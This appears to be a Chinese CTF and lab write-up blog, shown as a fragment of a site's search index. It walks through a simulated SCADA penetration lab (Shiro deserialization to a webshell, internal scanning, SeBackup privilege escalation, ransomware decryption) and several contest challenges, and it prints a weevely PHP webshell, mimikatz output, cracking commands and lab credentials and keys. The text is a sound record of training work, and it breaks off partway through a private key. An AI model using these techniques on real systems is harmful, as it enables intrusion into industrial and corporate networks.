http://39.98.113.46:8080/login;jsessionid=9D9BBC5BC01314BE4A8641EAA809995B [*] WebTitle http://39.98.113.46:8080/login;jsessionid=9D9BBC5BC01314BE4A8641EAA809995B code:200 len:2936 title:火创能源监控画面管理平台 [+] PocScan http://39.98.113.46:8080 poc-yaml-spring-actuator-heapdump-file [+] PocScan http://39.98.113.46:8080 poc-yaml-springboot-env-unauth spring2 发现内存泄露 java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump 拿到key CookieRememberMeManager(ShiroKey) ------------- algMode = CBC, key = QZYysgMYhG6/CzIJlVpR2g==, algName = AES 打shiro反序列化，注入冰蝎马，弹shell root@security:/# whoami root 发现是root权限，直接读flag ​ ","date":"2025-01-26","objectID":"/chunqiuyunjing-thermalpower/:1:1","series":null,"tags":["penetration","wp"],"title":"春秋云境-ThermalPower综合渗透","uri":"/chunqiuyunjing-thermalpower/#第一关"},{"categories":["penetration","wp"],"content":"\r内网渗透","date":"2025-01-26","objectID":"/chunqiuyunjing-thermalpower/:2:0","series":null,"tags":["penetration","wp"],"title":"春秋云境-ThermalPower综合渗透","uri":"/chunqiuyunjing-thermalpower/#内网渗透"},{"categories":["penetration","wp"],"content":"\r第三关关卡剧情：尝试接管 SCADA 工程师站，并启动锅炉。 内网信息收集 ifconfig eth0: flags=4163\u003cUP,BROADCAST,RUNNING,MULTICAST\u003e mtu 1500 inet 172.22.17.213 netmask 255.255.0.0 broadcast 172.22.255.255 inet6 fe80::216:3eff:fe0d:1e04 prefixlen 64 scopeid 0x20\u003clink\u003e ether 00:16:3e:0d:1e:04 txqueuelen 1000 (Ethernet) RX packets 130589 bytes 159982146 (159.9 MB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 55074 bytes 39322967 (39.3 MB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 lo: flags=73\u003cUP,LOOPBACK,RUNNING\u003e mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 inet6 ::1 prefixlen 128 scopeid 0x10\u003chost\u003e loop txqueuelen 1000 (Local Loopback) RX packets 1876 bytes 158193 (158.1 KB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 1876 bytes 158193 (158.1 KB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 内网fscan ./fscan -h 172.22.17.213/24 ___ _ / _ \\ ___ ___ _ __ __ _ ___| | __ / /_\\/____/ __|/ __| '__/ _` |/ __| |/ / / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u003c \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ fscan version: 1.8.4 start infoscan (icmp) Target 172.22.17.6 is alive (icmp) Target 172.22.17.213 is alive [*] Icmp alive hosts len is: 2 172.22.17.213:8080 open 172.22.17.6:445 open 172.22.17.6:139 open 172.22.17.6:135 open 172.22.17.6:80 open 172.22.17.213:22 open 172.22.17.6:21 open [*] alive ports len is: 7 start vulscan [*] NetBios 172.22.17.6 WORKGROUP\\WIN-ENGINEER [*] NetInfo [*]172.22.17.6 [-\u003e]WIN-ENGINEER [-\u003e]172.22.17.6 [*] WebTitle http://172.22.17.213:8080 code:302 len:0 title:None 跳转url: http://172.22.17.213:8080/login;jsessionid=F27C36D7263AE95B6931636B7EE0CB1D [*] WebTitle http://172.22.17.213:8080/login;jsessionid=F27C36D7263AE95B6931636B7EE0CB1D code:200 len:2936 title:火创能源监控画面管理平台 [+] ftp 172.22.17.6:21:anonymous [-\u003e]Modbus [-\u003e]PLC [-\u003e]web.config [-\u003e]WinCC [-\u003e]内部软件 [-\u003e]火创能源内部资料 [*] WebTitle http://172.22.17.6 code:200 len:661 title:172.22.17.6 - / [+] PocScan http://172.22.17.213:8080 poc-yaml-spring-actuator-heapdump-file [+] PocScan http://172.22.17.213:8080 poc-yaml-springboot-env-unauth spring2 发现有可anonymous登录的ftp 也可以直接访问80端口 frp穿透出来 ​ 拿到相关机器账号密码 http://172.22.17.6/%E7%81%AB%E5%88%9B%E8%83%BD%E6%BA%90%E5%86%85%E9%83%A8%E8%B5%84%E6%96%99/SCADA.txt WIN-SCADA: 172.22.26.xx Username: Administrator Password: IYnT3GyCiy3 frp扫一下172.22.26.0/24得到 ./fscan -h 172.22.26.0/24 ___ _ / _ \\ ___ ___ _ __ __ _ ___| | __ / /_\\/____/ __|/ __| '__/ _` |/ __| |/ / / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u003c \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ fscan version: 1.8.4 start infoscan (icmp) Target 172.22.26.11 is alive [*] Icmp alive hosts len is: 1 172.22.26.11:1433 open 172.22.26.11:139 open 172.22.26.11:135 open 172.22.26.11:80 open 172.22.26.11:445 open [*] alive ports len is: 5 start vulscan [*] NetBios 172.22.26.11 WORKGROUP\\WIN-SCADA [+] mssql 172.22.26.11:1433:sa 123456 [*] NetInfo [*]172.22.26.11 [-\u003e]WIN-SCADA [-\u003e]172.22.26.11 [*] WebTitle http://172.22.26.11 code:200 len:703 title:IIS Windows Server rdp连过去172.22.26.11 ​ 开启锅炉得到flag ","date":"2025-01-26","objectID":"/chunqiuyunjing-thermalpower/:2:1","series":null,"tags":["penetration","wp"],"title":"春秋云境-ThermalPower综合渗透","uri":"/chunqiuyunjing-thermalpower/#第三关"},{"categories":["penetration","wp"],"content":"\r第二关尝试接管 SCADA 工程师的个人 PC，并通过滥用 Windows 特权组提升至系统权限。 在ftp中 从“内部员工通讯录.xlsx”中获取到员工信息 ​ 从“火创能源内部通知.docx”中获取到默认密码规则 2. 登陆账户设置： 为方便管理和标准化，登陆账户名将采用姓名全称的小写拼音形式。例如，张三的账户名为zhangsan，工号为0801。初始密码将由账户名+@+工号组成，例如，zhangsan@0801。 随机登录一个chenhua/chenhua@0813 rdp连到172.22.17.6 根据题目信息，需要用特权组提权，查看账户的特权组 ​ 可以看到该用户是属于 Backup Operators 组的一部分，默认情况下会授予该组 SeBackup 和 SeRestore 权限，SeBackup 和 SeRestore 权限允许用户读取和写入系统中的任何文件，而忽略任何适当的 DACL（自由访问控制列表）。 此权限存在的背后动机是允许某些用户在系统中执行备份操作，而无需授予其完全的管理权限。 一旦拥有 SeBackup 和 SeRestore 权限，攻击者就可以通过使用多种技术轻松进行提权操作。 包括复制 SAM 和 SYSTEM 注册表配置单元（registry hives）以提取本地管理员的密码 hash 值。 但这里并没有给用户默认分配 SeBackup 权限 ​ ‍ PS C:\\Windows\\system32\u003e cd C:\\Users\\chenhua\\Desktop\\ PS C:\\Users\\chenhua\\Desktop\u003e Import-Module .\\SeBackupPrivilegeUtils.dll PS C:\\Users\\chenhua\\Desktop\u003e Import-Module .\\SeBackupPrivilegeCmdLets.dll PS C:\\Users\\chenhua\\Desktop\u003e Set-SeBackupPrivilege PS C:\\Users\\chenhua\\Desktop\u003e Get-SeBackupPrivilege SeBackupPrivilege is enabled PS C:\\Users\\chenhua\\Desktop\u003e Copy-FileSeBackupPrivilege C:\\Users\\Administrator\\flag\\flag02.txt C:\\Users\\chenhua\\Desktop\\flag02.txt -Overwrite Copied 350 bytes PS C:\\Users\\chenhua\\Desktop\u003e cat flag02.txt 使用 impacket-secretsdump 从注册表转储文件中获取 ntlm 哈希： ​ ","date":"2025-01-26","objectID":"/chunqiuyunjing-thermalpower/:2:2","series":null,"tags":["penetration","wp"],"title":"春秋云境-ThermalPower综合渗透","uri":"/chunqiuyunjing-thermalpower/#第二关"},{"categories":["penetration","wp"],"content":"\r第四关关卡剧情：尝试获取 SCADA 工程师站中的数据库备份，并分析备份文件是否泄漏了敏感数据。 rdp连回172.22.26.11 Win + D 返回desktop，发现桌面上有一个ScadaDB.sql.locky，还有一个勒索文件，说我们的文件已被加密 ​ 在 C 盘找到勒索病毒程序 Lockyou.exe ida分析一下，发现该程序使用了 AES 加密文件 题目描述里给了一个privateKey和encryptedAesKey，使用privateKey用rsa加密了aeskey得到的encryptedAesKey #privateKey \u003cRSAKeyValue\u003e\u003cModulus\u003euoL2CAaVtMVp7b4/Ifcex2Artuu2tvtBO25JdMwAneu6gEPCrQvDyswebchA1LnV3e+OJV5kHxFTp/diIzSnmnhUmfZjYrshZSLGm1fTwcRrL6YYVsfVZG/4ULSDURfAihyN1HILP/WqCquu1oWo0CdxowMsZpMDPodqzHcFCxE=\u003c/Modulus\u003e\u003cExponent\u003eAQAB\u003c/Exponent\u003e\u003cP\u003e2RPqaofcJ/phIp3QFCEyi0kj0FZRQmmWmiAmg/C0MyeX255mej8Isg0vws9PNP3RLLj25O1pbIJ+fqwWfUEmFw==\u003c/P\u003e\u003cQ\u003e2/QGgIpqpxODaJLQvjS8xnU8NvxMlk110LSUnfAh/E6wB/XUc89HhWMqh4sGo/LAX0n94dcZ4vLMpzbkVfy5Fw==\u003c/Q\u003e\u003cDP\u003eulK51o6ejUH/tfK281A7TgqNTvmH7fUra0dFR+KHCZFmav9e/na0Q//FivTeC6IAtN5eLMkKwDSR1rBm7UPKKQ==\u003c/DP\u003e\u003cDQ\u003ePO2J541wIbvsCMmyfR3KtQbAmVKmPHRUkG2VRXLBV0zMwke8hCAE5dQkcct3GW8jDsJGS4r0JsOvIRq5gYAyHQ==\u003c/DQ\u003e\u003cInverseQ\u003eJS2ttB0WJm223plhJQrWqSvs9LdEeTd8cgNWoyTkMOkYIieRTRko/RuXufgxppl4bL9RRTI8e8tkHoPzNLK4bA==\u003c/InverseQ\u003e\u003cD\u003etuLJ687BJ5RYraZac6zFQo178A8siDrRmTwozV1o0XGf3DwVfefGYmpLAC1X3QAoxUosoVnwZUJxPIfodEsieDoxRqVxMCcKbJK3nwMdAKov6BpxGUloALlxTi6OImT6w/roTW9OK6vlF54o5U/4DnQNUM6ss/2/CMM/EgM9vz0=\u003c/D\u003e\u003c/RSAKeyValue\u003e 先把XML转成PEM格式 https://www.ssleye.com/ssltool/pem_xml.html -----BEGIN PRIVATE KEY----- MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBALqC9ggGlbTFae2+ PyH3HsdgK7brtrb7QTtuSXTMAJ3ruoBDwq0Lw8rMHm3IQNS51d3vjiVeZB8RU6f3 YiM0p5p4VJn2Y2K7IWUixptX08HEay+mGFbH1WRv+FC0g1EXwIocjdRyCz/1qgqr rtaFqNAncaMDLGaTAz6Hasx3BQsRAgMBAAECgYEAtuLJ687BJ5RYraZac6zFQo17 8A8siDrRmTwozV1o0XGf3DwVfefGYmpLAC1X3QAoxUosoVnwZUJxPIfodEsieDox RqVxMCcKbJK3nwMdAKov6BpxGUloALlxTi6OImT6w/roTW9OK6vlF54o5U/4DnQN UM6ss/2/CMM/EgM9vz0CQQDZE+pqh9wn+mEindAUITKLSSPQVlFCaZaaICaD8LQz J5fbnmZ6PwiyDS/Cz080/dEsuPbk7Wlsgn5+rBZ9QSYXAkEA2/QGgIpqpxODaJLQ vjS8xnU8NvxMlk110LSUnfAh/E6wB/XUc89HhWMqh4sGo/LAX0n94dcZ4vLMpzbk Vfy5FwJBALpSudaOno1B/7XytvNQO04KjU75h+31K2tHRUfihwmRZmr/Xv52tEP/ xYr03guiALTeXizJCsA0kdawZu1DyikCQDztieeNcCG77AjJsn0dyrUGwJlSpjx0 VJBtlUVywVdMzMJHvIQgBOXUJHHLdxlvIw7CRkuK9CbDryEauYGAMh0CQCUtrbQd FiZttt6ZYSUK1qkr7PS3RHk3fHIDVqMk5DDpGCInkU0ZKP0bl7n4MaaZeGy/UUUy PHvLZB6D8zSyuGw= -----END PRIVATE KEY----- 把encryptedAesKey解一下 https://www.lddgo.net/encrypt/rsa ​ 最后写个aes脚本解一下ScadaDB.sql.locky，把前16位作为iv from Crypto.Cipher import AES from Crypto.Util.Padding import unpad import base64 # 读取加密文件内容 encrypted_file = 'ScadaDB.sql.locky' with open(encrypted_file, 'rb') as file: encrypted_data = file.read() # 解密密钥 key = 'cli9gqXpTrm7CPMcdP9TSmVSzXVgSb3jrW+AakS7azk=' key = base64.b64decode(key) # 按照每 16 位数据作为 IV 进行解密 iv = encrypted_data[:16] # 创建 AES 解密器 cipher = AES.new(key, AES.MODE_CBC, IV=iv) # 解密数据（去除 IV 后的部分） decrypted_data = unpad(cipher.decrypt(encrypted_data[16:]), AES.block_size) # 写入解密后的内容到新文件 decrypted_file = 'decrypted_file.txt' with open(decrypted_file, 'wb') as file: file.write(decrypted_data) print(f'文件解密完成，解密后的数据已保存到 {decrypted_file}') 随后在解密后的文件里查找flag ​ ‍ ","date":"2025-01-26","objectID":"/chunqiuyunjing-thermalpower/:2:3","series":null,"tags":["penetration","wp"],"title":"春秋云境-ThermalPower综合渗透","uri":"/chunqiuyunjing-thermalpower/#第四关"},{"categories":["wp"],"content":"1.17，1.18，1.19为期三天 ","date":"2025-01-20","objectID":"/2024cqbdjs/:0:0","series":null,"tags":["wp"],"title":"2024 春秋杯网络安全联赛冬季赛","uri":"/2024cqbdjs/#"},{"categories":["wp"],"content":"\rcrypto","date":"2025-01-20","objectID":"/2024cqbdjs/:1:0","series":null,"tags":["wp"],"title":"2024 春秋杯网络安全联赛冬季赛","uri":"/2024cqbdjs/#crypto"},{"categories":["wp"],"content":"\r你是小哈斯?题目内容：年轻黑客小符参加CTF大赛，他发现这个小哈斯文件的内容存在高度规律性，并且文件名中有隐藏信息，他成功找到了隐藏的信息，并破解了挑战。得意地说：“成功在于探索与质疑，碰撞是发现真相的关键！” exp： import hashlib def calculate_sha1(input_string): \"\"\"计算字符串的SHA-1哈希值\"\"\" sha1 = hashlib.sha1() sha1.update(input_string.encode('utf-8')) return sha1.hexdigest() def find_matching_characters(hashes): \"\"\"找到与哈希值匹配的Base64字符与其他字符\"\"\" base64_chars = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/={}_,.-\" results = [] for hash_value in hashes: match_found = False for char in base64_chars: if calculate_sha1(char) == hash_value: results.append(char) match_found = True break if not match_found: results.append('No match found') return results def read_hashes_from_file(filename): \"\"\"从文件中读取SHA-1哈希值\"\"\" with open(filename, 'r') as file: hashes = file.readlines() return [hash.strip() for hash in hashes] # 读取SHA-1哈希值文件 hashes = read_hashes_from_file('sha1.txt') # 查找匹配的Base64字符 results = find_matching_characters(hashes) # 拼接所有匹配的字符 decrypted_string = ''.join(results) # 输出解密后的字符串 print(f\"Decrypted String: {decrypted_string}\") ​ ","date":"2025-01-20","objectID":"/2024cqbdjs/:1:1","series":null,"tags":["wp"],"title":"2024 春秋杯网络安全联赛冬季赛","uri":"/2024cqbdjs/#你是小哈斯"},{"categories":["wp"],"content":"\r通往哈希的旅程题目内容：在数字城，大家都是通过是通过数字电话进行的通信,常见是以188开头的11位纯血号码组成，亚历山大抵在一个特殊的地方截获一串特殊的字符串\"ca12fd8250972ec363a16593356abb1f3cf3a16d\"，通过查阅发现这个跟以前散落的国度有点相似，可能是去往哈希国度的。年轻程序员亚力山大抵对这个国度充满好奇，决定破译这个哈希值。在经过一段时间的摸索后，亚力山大抵凭借强大的编程实力成功破解，在输入对应字符串后瞬间被传送到一个奇幻的数据世界，同时亚力山大抵也开始了他的进修之路。(提交格式：flag{11位号码}） exp import hashlib # 目标哈希值 target_hash = \"ca12fd8250972ec363a16593356abb1f3cf3a16d\" # 遍历以188开头的11位号码 for number in range(18800000000, 18899999999 + 1): # 将号码转换为字符串 candidate = str(number) # 计算SHA-1哈希值 sha1_hash = hashlib.sha1(candidate.encode()).hexdigest() # 比较哈希值 if sha1_hash == target_hash: print(f\"找到匹配的号码: {candidate}\") break ​ ","date":"2025-01-20","objectID":"/2024cqbdjs/:1:2","series":null,"tags":["wp"],"title":"2024 春秋杯网络安全联赛冬季赛","uri":"/2024cqbdjs/#通往哈希的旅程"},{"categories":["wp"],"content":"\rmisc","date":"2025-01-20","objectID":"/2024cqbdjs/:2:0","series":null,"tags":["wp"],"title":"2024 春秋杯网络安全联赛冬季赛","uri":"/2024cqbdjs/#misc"},{"categories":["wp"],"content":"\r简单算术题目内容：想想异或 赛博厨子XOR Brute Force ​ ","date":"2025-01-20","objectID":"/2024cqbdjs/:2:1","series":null,"tags":["wp"],"title":"2024 春秋杯网络安全联赛冬季赛","uri":"/2024cqbdjs/#简单算术"},{"categories":["wp"],"content":"\r简单镜像提取题目内容：RR_studio 导出文件 ​ 解压后用R-studio加载 ​ 随后恢复销售报表 ​ ​ ","date":"2025-01-20","objectID":"/2024cqbdjs/:2:2","series":null,"tags":["wp"],"title":"2024 春秋杯网络安全联赛冬季赛","uri":"/2024cqbdjs/#简单镜像提取"},{"categories":["wp"],"content":"\rSee anything in these pics?题目内容：TBH THERE ARE SO MANY PICS NOT ONLY JUST 2 PIC Aztec 条码扫描 ​ 得到解压密码5FIVE 对得到的jpg文件进行foremost分解得到png 再对png进行宽高修复，得到flag ​ ","date":"2025-01-20","objectID":"/2024cqbdjs/:2:3","series":null,"tags":["wp"],"title":"2024 春秋杯网络安全联赛冬季赛","uri":"/2024cqbdjs/#see-anything-in-these-pics"},{"categories":["wp"],"content":"\r压力大，写个脚本吧题目内容：爆破 解压之后发现是password_xx.txt中字符串from base64作为密码，解压zip_xx.zip ​ 写个脚本批量解密 import zipfile import os import base64 import re def read_password_file(password_file): # 读取并解码密码文件 with open(password_file, 'r') as f: return base64.b64decode(f.read().strip()).decode() def extract_zip(zip_path, password): # 解压zip文件并返回解压出的zip文件路径（如果存在） dir_name = os.path.dirname(zip_path) with zipfile.ZipFile(zip_path) as zf: zf.extractall(path=dir_name, pwd=password.encode()) for file in zf.namelist(): if file.endswith('.zip'): return os.path.join(dir_name, file) return None def collect_all_passwords(start_zip): # 收集所有解压过程中的密码 current_zip, passwords, processed = start_zip, [], set() while current_zip and os.path.exists(current_zip) and current_zip not in processed: processed.add(current_zip) # 提取文件名中的数字 match = re.search(r\"(\\d+)\", os.path.basename(current_zip)) if not match: print(f\"文件名中未找到数字: {current_zip}\") break password_file = f'password_{match.group(1)}.txt' if not os.path.exists(password_file): print(f\"密码文件 {password_file} 不存在，停止处理\") break print(f\"处理: {current_zip}\\n使用密码文件: {password_file}\") try: password = read_password_file(password_file) passwords.append(password) print(f\"解码后的密码: {password[:20]}...\") current_zip = extract_zip(current_zip, password) print(f\"发现新的zip文件: {current_zip}\" if current_zip else \"未找到更多的zip文件，处理完成！\") except Exception as e: print(f\"处理出错: {str(e)}\") break return passwords def create_png_from_passwords(passwords, output_file=\"flag.png\"): # 从密码列表创建PNG文件 cleaned_hex = ''.join(c for p in passwords[::-1] for c in p if c in '0123456789ABCDEFabcdef') if '89504E47' not in cleaned_hex.upper(): # 检查PNG文件头 print(\"未找到PNG文件头，数据可能不完整\") return False if len(cleaned_hex) % 2 != 0: # 确保十六进制长度为偶数 cleaned_hex = cleaned_hex[:-1] try: with open(output_file, \"wb\") as f: f.write(bytes.fromhex(cleaned_hex)) print(f\"成功创建PNG文件: {output_file}\") return True except Exception as e: print(f\"创建PNG文件时出错: {str(e)}\") return False def main(): # 主函数，执行完整的处理流程 start_zip = \"zip_98.zip\" print(\"步骤1: 开始收集所有密码...\") passwords = collect_all_passwords(start_zip) if not passwords: print(\"未收集到任何密码！\") return print(f\"\\n步骤2: 共收集到 {len(passwords)} 个密码\\n\\n步骤3: 开始生成PNG文件...\") print(\"\\n处理完成！请查看生成的flag.png文件\" if create_png_from_passwords(passwords) else \"\\n生成PNG文件失败！\") if __name__ == \"__main__\": main() 最后扫描二维码 ​ ‍ ","date":"2025-01-20","objectID":"/2024cqbdjs/:2:4","series":null,"tags":["wp"],"title":"2024 春秋杯网络安全联赛冬季赛","uri":"/2024cqbdjs/#压力大写个脚本吧"},{"categories":["wp"],"content":"\rez_forensics扫描时间线，发现有相关文件 ​ ​ 但f14g.7z是损坏的，使用R-Studio进行提取 ​ 根据hint.txt 60 = ( ) + ( ) W@S Q9@S=5 RPW 92Q95S\u003eN 7@P R96 N2QQU@P5 @7 R96 sXa ​ 提取密码 mimikatz模块 Module User Domain Password -------- ---------------- ---------------- ---------------------------------------- wdigest Flu0r1n3 Flu0r1n3-PC strawberries wdigest FLU0R1N3-PC$ WORKGROUP 密码为strawberries，解压得到flag_is_here.ini 查看内容，根据hint可推测为MobaXterm的ini配置文件 提取ini中的root加密密文，使用MobaXtermCipher.py进行解密 ​ ​ 主密钥为flag_is_here（文件名，有点脑洞…..） 随后base64解码得到flag 使用github的解密工具进行解密，得到flag{you_are_a_g00d_guy} ","date":"2025-01-20","objectID":"/2024cqbdjs/:2:5","series":null,"tags":["wp"],"title":"2024 春秋杯网络安全联赛冬季赛","uri":"/2024cqbdjs/#ez_forensics"},{"categories":["wp"],"content":"\r音频的秘密deepsound，密码123 ​ 7z，真压缩，发现加密算法是ZipCrypto Store，可以尝试明文攻击 ​ 但如果是： AES-256 Deflate AES-256 Store 这两种压缩算法，那就没办法明文攻击 我们可以利用只有这个文件头的png文件对该压缩包明文攻击 echo 89504E470D0A1A0A0000000D49484452 | xxd -r -ps \u003e png_header 随后 bkcrack -C flag.zip -c flag.png -p png_header 随后得到keys：29d29517 0fa535a9 abc67696 随后 ./bkcrack -C flag.zip -c flag.png -k 29d29517 0fa535a9 abc67696 -d flag.png -d flag.png ​ 得到png图片 ​ 随后lsb，可以随波逐流一把梭 ​ stegsolve也可以 ​ ","date":"2025-01-20","objectID":"/2024cqbdjs/:2:6","series":null,"tags":["wp"],"title":"2024 春秋杯网络安全联赛冬季赛","uri":"/2024cqbdjs/#音频的秘密"},{"categories":["wp"],"content":"\rWeevil’s Whisper题目内容：Bob found that his computer had been hacked. Fortunately, he was using wireshark to test packet capture before the hack. Would you please analyze the packet and find out what the hacker did weevely木马流量 追踪http流 ​ \u003c?php $k=\"161ebd7d\";$kh=\"45089b3446ee\";$kf=\"4e0d86dbcf92\";$p=\"lFDu8RwONqmag5ex\"; function x($t,$k){ $c=strlen($k);$l=strlen($t);$o=\"\"; for($i=0;$i\u003c$l;){ for($j=0;($j\u003c$c\u0026\u0026$i\u003c$l);$j++,$i++) { $o.=$t[$i]^$k[$j]; } } return $o; } if (@preg_match(\"/$kh(.+)$kf/\",@file_get_contents(\"php://input\"),$m)==1) { @ob_start(); @eval(@gzuncompress(@x(@base64_decode($m[1]),$k))); $o=@ob_get_contents(); @ob_end_clean(); $r=@base64_encode(@x(@gzcompress($o),$k)); print(\"$p$kh$r$kf\"); } ?\u003e 根据木马脚本写个解密脚本 \u003c?php $k = \"161ebd7d\"; $kh = \"45089b3446ee\"; $kf = \"4e0d86dbcf92\"; $p = \"lFDu8RwONqmag5ex\"; // 异或加密/解密函数 function x($t, $k) { $c = strlen($k); $l = strlen($t); $o = \"\"; for ($i = 0; $i \u003c $l;) { for ($j = 0; ($j \u003c $c \u0026\u0026 $i \u003c $l); $j++, $i++) { $o .= $t[$i] ^ $k[$j]; } } return $o; } // 密文 $encrypted_data = \"lFDu8RwONqmag5ex45089b3446eeSap6risomCodHP/PqrQaqvueeU+wURkueAeGLStP+bQE+HqsLq39zTQ2L1hsAA==4e0d86dbcf92\"; // 去掉前缀和标记 if (strpos($encrypted_data, $p) === 0 \u0026\u0026 strpos($encrypted_data, $kh) !== false \u0026\u0026 strpos($encrypted_data, $kf) !== false) { // 去掉前缀 $p $encrypted_data = substr($encrypted_data, strlen($p)); // 去掉起始标记 $kh 和结束标记 $kf $encrypted_data = substr($encrypted_data, strlen($kh), -strlen($kf)); } else { die(\"Invalid encrypted data format.\"); } // Base64 解码 $base64_decoded = base64_decode($encrypted_data); // 使用密钥 $k 解密 $decrypted_data = x($base64_decoded, $k); // Gzip 解压缩 $uncompressed_data = gzuncompress($decrypted_data); // 输出解密后的数据 echo \"Decrypted data: \" . $uncompressed_data . \"\\n\"; ?\u003e 解密流25的响应流量得到flag lFDu8RwONqmag5ex45089b3446eeSap6risomCodHP/PqrQaqvueeU+wURkueAeGLStP+bQE+HqsLq39zTQ2L1hsAA==4e0d86dbcf92 ​ ","date":"2025-01-20","objectID":"/2024cqbdjs/:2:7","series":null,"tags":["wp"],"title":"2024 春秋杯网络安全联赛冬季赛","uri":"/2024cqbdjs/#weevils-whisper"},{"categories":["wp"],"content":"\rfind me题目内容：0x1337年奶龙大军入侵地球，人类命运危在旦夕。就在这紧急时刻，cow与贝利亚大人进行了联络，寻求帮助。伟大的贝利亚给了cow一份文件，而在这文件里藏着拯救地球的秘密，你能否找到它！！！！ 在bigbigcowcow目录下发现flag.zip，同时根据icon.png推测应该是mc地图 ​ 去最近的雪屋看一下 得到了key：cwqeafvfwqead ​ ‍ 解压得到 Who is bigbigcowcow I'am bigbigcowcow hahahahah OK this is Your flag: unai?535.0a20[189.[4049[ax30[e.j60xaj91x8+ 随波逐流一把梭 ​ ","date":"2025-01-20","objectID":"/2024cqbdjs/:2:8","series":null,"tags":["wp"],"title":"2024 春秋杯网络安全联赛冬季赛","uri":"/2024cqbdjs/#find-me"},{"categories":["wp"],"content":"\rNetHttP题目内容：在凌晨一两点，公司内网有一台私人服务器被入侵，攻击者非常挑衅的留下了明显的痕迹。 ssti盲注 处理的有点麻烦，先把pcapng流量转为csv，存入data.txt 随后 solve1.py # 打开 data.txt 文件并读取所有行 with open('data.txt', 'r') as file: lines = file.readlines() # 创建一个列表来存储包含 \"64\" 的数据行的前两行 result_lines = [] # 遍历所有行 for i, line in enumerate(lines): if '\"66\"' in line: # 检查当前行是否包含 \"64\" # 如果当前行包含 \"64\"，则将其前两行添加到结果列表中（如果存在） if i \u003e= 2: # 确保有前两行 result_lines.append(lines[i-2]) # 前第二行 elif i == 1: # 如果当前行是第二行，只有前一行 result_lines.append(lines[i-1]) # 前第一行 # 将包含 \"64\" 的行也添加到结果列表中 result_lines.append(line) # 将结果写入 result1.txt 文件 with open('result1.txt', 'w') as result_file: result_file.writelines(result_lines) print(\"数据已成功提取并写入 result1.txt 文件。\") 随后solve2.py # 读取文件并删除包含 \"HTTP/1.1 200 OK\" 的行 with open('result1.txt', 'r') as file: lines = file.readlines() # 过滤掉包含 \"HTTP/1.1 200 OK\" 的行 filtered_lines = [line for line in lines if \"HTTP/1.1 200 OK\" not in line] # 将过滤后的内容写回文件 with open('result2.txt', 'w') as file: file.writelines(filtered_lines) print(\"包含 'HTTP/1.1 200 OK' 的行已删除。\") 随后solve3.py import re # 打开result2.txt文件进行读取 with open('result2.txt', 'r') as file: lines = file.readlines() # 打开result3.txt文件进行写入 with open('result3.txt', 'w') as output_file: for line in lines: # 使用正则表达式提取\"echo\"和\"|\"之间的数据 match = re.search(r'echo\\s+(.*?)\\s*\\|', line) if match: # 提取到的数据 extracted_data = match.group(1) # 将提取到的数据写入result3.txt output_file.write(extracted_data + '\\n') print(\"数据提取完成，已写入result3.txt\") 随后solve4.py import re # 读取文件内容 with open('result4.txt', 'r') as file: lines = file.readlines() # 用于存储位置和字符的字典 char_dict = {} # 正则表达式提取位置和字符 pattern = r'cut -c (\\d+)\\) == \\'(.?)\\'' for line in lines: match = re.search(pattern, line) if match: position = int(match.group(1)) # 提取位置 char = match.group(2) # 提取字符 char_dict[position] = char # 按位置排序并拼接字符串 sorted_chars = [char_dict[pos] for pos in sorted(char_dict.keys())] result = ''.join(sorted_chars) # 输出结果 print(\"提取的字符串为:\", result) with open('result5.txt', 'w') as output_file: output_file.write(result) print(\"结果已写入 result5.txt\") 随后solve5.py import re # 打开 result5.txt 文件进行读取 with open('result5.txt', 'r') as file: lines = file.readlines() # 用于存储位置和字符的字典 char_dict = {} # 正则表达式提取位置和字符 pattern = r\"cut -c (\\d+)\\).*== '(.*?)'\" for line in lines: match = re.search(pattern, line) if match: position = int(match.group(1)) # 提取位置 char = match.group(2) # 提取字符 char_dict[position] = char # 按位置排序并拼接字符串 sorted_chars = [char_dict[pos] for pos in sorted(char_dict.keys())] result = ''.join(sorted_chars) # 输出结果 print(\"提取的字符串为:\", result) # 将结果写入 result3.txt with open('result3.txt', 'w') as output_file: output_file.write(result) print(\"结果已写入 result6.txt\") 得到/flag是fake flag 另外/app/secret/mw/m5​推测跟流量中的key和rsa密钥有关 S0I3iWhvszKbOM/OalKTA0fpm5O5chVVnYGyKd5nV4erAzRbV6V6w8b/UiOfQEc3Ijh00hFjYFU1HaxNub9GnlPS/lcam5mATkf2sJS6JgpJo6AShVRxWDYKKrojeUeBZj5MEPI8/4DGGGuHFxmx2bxAahdDe1cGnjTZGWONpNI= ​ ​ 将rsa私钥解密 from cryptography.hazmat.primitives import serialization def decrypt_private_key(key_path, password): # 读取并解密私钥 with open(key_path, 'rb') as f: private_key = serialization.load_pem_private_key( f.read(), password=password.encode() ) # 导出未加密的私钥 decrypted_pem = private_key.private_bytes( encoding=serialization.Encoding.PEM, format=serialization.PrivateFormat.PKCS8, encryption_algorithm=serialization.NoEncryption() ) # 保存解密后的私钥 with open('decrypted_key.pem', 'wb') as f: f.write(decrypted_pem) print(\"私钥解密完成\") # 使用示例 decrypt_private_key('key.txt', 'gdkfksy05lx0nv8dl') 得到解密后的私钥 -----BEGIN PRIVATE KEY----- MIICdQIBADANBgkqhkiG9w0BAQEFAASCAl8wggJbAgEAAoGAaxYIU7D5lIndIBLu bRRywJZiAQ90QiRjuHAIsyyka69Wl1n9K4W9/hjNDeI5BP14oADSmOqLKmj8nw2w bk0mDZ0KbWfT3eCxttGoplMEoCqKizTMdHGe7MUaK9A2CKIHOsHQhkpAmwLcDzNr bLg9nx0hjPUDefqwCn1q7B/IQPMCAwEAAQKBgEQaQ/ttrpwfvUhbodQvT/dY7ET+ XhJ+cAjo/y9r8bkmTmx853xZVwYVIbt1pouc46zmOQjVCOJU2GwS2aScXdkx8Fm1 YQJqzbxcZ4oEA/f66E99560um3RRsa7DWKwNdIcU4wukyfgx5fILoiuE8ThjG23V 